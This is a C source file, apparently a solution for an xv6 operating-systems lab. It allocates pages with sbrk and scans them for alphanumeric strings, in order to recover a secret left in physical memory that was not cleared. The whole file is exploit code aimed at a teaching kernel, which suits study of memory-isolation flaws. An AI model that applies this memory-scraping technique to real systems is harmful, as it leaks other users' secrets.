// user/attack.c
// sbrk-based attack for the lab: allocate new pages via sbrk and scan
// each newly-allocated page for alphanumeric strings.

#include "kernel/types.h"
#include "user/user.h"

#define PGSIZE 4096
#define MIN_SECRET_LEN 4
#define MAX_SECRET_LEN 256

static int isalnumc(char c) {
  if (c >= '0' && c <= '9') return 1;
  if (c >= 'A' && c <= 'Z') return 1;
  if (c >= 'a' && c <= 'z') return 1;
  return 0;
}

int main(int argc, char *argv[]) {
  int tries = 2000;

  for (int t = 0; t < tries; t++) {
    // allocate a page using sbrk
    char *p = (char*)sbrk(PGSIZE);
    if (p == (char*)-1) {
      // allocation failed; try next iteration
      continue;
    }

    // scan the page for alphanumeric sequences
    int i = 0;
    int found_any = 0;
    while (i < PGSIZE) {
      if (!isalnumc(p[i])) { i++; continue; }
      char buf[MAX_SECRET_LEN+1];
      int k = 0;
      while (i < PGSIZE && isalnumc(p[i]) && k < MAX_SECRET_LEN) {
        buf[k++] = p[i++];
      }
      buf[k] = 0;
      if (k >= MIN_SECRET_LEN) {
        // print candidate (stdout)
        printf("%s\n", buf);
        // prefer short/typical secrets; accept and exit
        if (k <= 64) {
          exit(0);
        }
        found_any = 1;
      }
    }

    if ((t % 100) == 0) {
      // progress to stderr (so you still see it even if stdout redirected)
      fprintf(2, "attack: tried %d pages found_any=%d\n", t, found_any);
    }
  }

  fprintf(2, "attack: finished - no candidate found\n");
  exit(1);
}

